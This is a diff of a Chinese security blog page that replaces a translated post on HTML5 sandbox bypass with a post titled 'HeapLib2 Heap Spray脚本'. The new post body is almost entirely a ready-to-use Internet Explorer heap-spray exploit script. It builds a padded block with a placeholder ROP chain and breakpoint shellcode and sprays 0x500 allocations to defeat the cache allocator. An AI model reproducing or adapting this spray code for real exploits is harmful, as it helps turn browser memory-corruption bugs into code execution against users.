@@ -69,7 +69,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="翻译," />
+  <meta name="keywords" content="Hexo, NexT" />
 
 
 
@@ -85,16 +85,19 @@
 
 
 
-<meta name="description" content="可以移步到看雪论坛观赏，地址 http://bbs.pediy.com/thread-216185.htm有可能很多地方会有问题，语句不通顺之类的，请在看雪论坛留言。">
+<meta name="description" content="&amp;lt;!DOCTYPE html&amp;gt;
+honk    var obj = document.getElementById(“wonk”);    //Create a heapLib2 object for Internet Explorer    var heap = new heapLib2.ie(obj, 0x80000);     var code = unescape(“%uccc">
 <meta property="og:type" content="article">
-<meta property="og:title" content="HTML5沙盒绕过(翻译)">
-<meta property="og:url" content="http://yoursite.com/2017/03/07/HTML5沙盒绕过-翻译/index.html">
+<meta property="og:title" content="HeapLib2 Heap Spray脚本">
+<meta property="og:url" content="http://yoursite.com/2017/03/24/HeapLib2-Heap-Spray脚本/index.html">
 <meta property="og:site_name" content="hackyzh'blog">
-<meta property="og:description" content="可以移步到看雪论坛观赏，地址 http://bbs.pediy.com/thread-216185.htm有可能很多地方会有问题，语句不通顺之类的，请在看雪论坛留言。">
-<meta property="og:updated_time" content="2017-03-07T14:00:28.000Z">
+<meta property="og:description" content="&amp;lt;!DOCTYPE html&amp;gt;
+honk    var obj = document.getElementById(“wonk”);    //Create a heapLib2 object for Internet Explorer    var heap = new heapLib2.ie(obj, 0x80000);     var code = unescape(“%uccc">
+<meta property="og:updated_time" content="2017-03-24T12:15:48.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="HTML5沙盒绕过(翻译)">
-<meta name="twitter:description" content="可以移步到看雪论坛观赏，地址 http://bbs.pediy.com/thread-216185.htm有可能很多地方会有问题，语句不通顺之类的，请在看雪论坛留言。">
+<meta name="twitter:title" content="HeapLib2 Heap Spray脚本">
+<meta name="twitter:description" content="&amp;lt;!DOCTYPE html&amp;gt;
+honk    var obj = document.getElementById(“wonk”);    //Create a heapLib2 object for Internet Explorer    var heap = new heapLib2.ie(obj, 0x80000);     var code = unescape(“%uccc">
 
 
 
@@ -115,9 +118,9 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/03/07/HTML5沙盒绕过-翻译/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/03/24/HeapLib2-Heap-Spray脚本/"/>
 
-  <title> HTML5沙盒绕过(翻译) | hackyzh'blog </title>
+  <title> HeapLib2 Heap Spray脚本 | hackyzh'blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -280,7 +283,7 @@
             
             
               
-                HTML5沙盒绕过(翻译)
+                HeapLib2 Heap Spray脚本
               
             
           </h1>
@@ -292,8 +295,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2017-03-07T21:57:24+08:00" content="2017-03-07">
-              2017-03-07
+            <time itemprop="dateCreated" datetime="2017-03-24T20:14:44+08:00" content="2017-03-24">
+              2017-03-24
             </time>
           </span>
 
@@ -303,8 +306,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2017/03/07/HTML5沙盒绕过-翻译/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/03/07/HTML5沙盒绕过-翻译/" itemprop="commentsCount"></span>
+                <a href="/2017/03/24/HeapLib2-Heap-Spray脚本/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/03/24/HeapLib2-Heap-Spray脚本/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -329,8 +332,26 @@
       
 
       
-        <p>可以移步到看雪论坛观赏，地址 <a href="http://bbs.pediy.com/thread-216185.htm" target="_blank" rel="external">http://bbs.pediy.com/thread-216185.htm</a><br>有可能很多地方会有问题，语句不通顺之类的，请在看雪论坛留言。</p>
+        <p>&lt;!DOCTYPE html&gt;</p>
+<html><br><br><head><br><script type="text/javascript" src="heapLib2.js"></script><br></head><br><body><br><h1 id="wonk" data-wonk="wonky">honk</h1><br><br><script type="text/javascript"><br>    var obj = document.getElementById(“wonk”);<br><br>    //Create a heapLib2 object for Internet Explorer<br>    var heap = new heapLib2.ie(obj, 0x80000);<br>     var code = unescape(“%ucccc”);<br>     while(code.length<400) code += code;
+    code  = code.substring(0,400);
+ var rop = unescape("%u4141%u4141%u4242%u4242%u4343%u4343%u4444%u4444%u4545%u4545%u4646%u4646%u4747%u4747%u4848%u4848");
+ var pad = unescape("%u9090%u9090");
+ while (pad.length < 0x1000) pad += pad;
 
+ offset_length = 0x5E6;
+ junk_offset = pad.substring(0, offset_length);
+
+ var shellcode = junk_offset + rop + code + pad.substring(0, 0x800 - code.length - junk_offset.length - rop.length);
+ while (shellcode.length < 0x40000) shellcode += shellcode;
+ var block = shellcode.substring(2, 0x40000 - 0x21);
+    for (var i = 0; i < 0x500; i++){
+            //this will bypass the cache allocator
+            heap.sprayalloc("big_attr"+i, block); 
+    }
+    heap.free("big_attr0");
+    alert("HeapLib2 done");
+</script><br></body><br><br></html>
       
     </div>
 
@@ -371,28 +392,18 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/翻译/" rel="tag">#翻译</a>
-          
-        </div>
-      
 
       
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/03/05/汽车黑客手册-翻译/" rel="next" title="汽车黑客手册(翻译)by hackyzh">
-                <i class="fa fa-chevron-left"></i> 汽车黑客手册(翻译)by hackyzh
+              <a href="/2017/03/20/IE-11-Heap-Spray脚本/" rel="next" title="IE 11 Heap Spray脚本">
+                <i class="fa fa-chevron-left"></i> IE 11 Heap Spray脚本
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/03/10/CVE-2013-0025-IE-UAF漏洞/" rel="prev" title="CVE-2013-0025 IE UAF漏洞">
-                CVE-2013-0025 IE UAF漏洞 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -407,10 +418,10 @@
 
     <div class="post-spread">
       
-        <div class="ds-share flat" data-thread-key="2017/03/07/HTML5沙盒绕过-翻译/"
-     data-title="HTML5沙盒绕过(翻译)"
+        <div class="ds-share flat" data-thread-key="2017/03/24/HeapLib2-Heap-Spray脚本/"
+     data-title="HeapLib2 Heap Spray脚本"
      data-content=""
-     data-url="http://yoursite.com/2017/03/07/HTML5沙盒绕过-翻译/">
+     data-url="http://yoursite.com/2017/03/24/HeapLib2-Heap-Spray脚本/">
   <div class="ds-share-inline">
     <ul  class="ds-share-icons-16">
 
@@ -437,8 +448,8 @@
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2017/03/07/HTML5沙盒绕过-翻译/"
-           data-title="HTML5沙盒绕过(翻译)" data-url="http://yoursite.com/2017/03/07/HTML5沙盒绕过-翻译/">
+      <div class="ds-thread" data-thread-key="2017/03/24/HeapLib2-Heap-Spray脚本/"
+           data-title="HeapLib2 Heap Spray脚本" data-url="http://yoursite.com/2017/03/24/HeapLib2-Heap-Spray脚本/">
       </div>
     
   </div>
@@ -582,7 +593,7 @@
               
             
             
-              <p class="post-toc-empty">此文章未包含目录</p>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#wonk"><span class="nav-number">1.</span> <span class="nav-text">honk</span></a></li></ol></div>
             
           </div>
         </section>
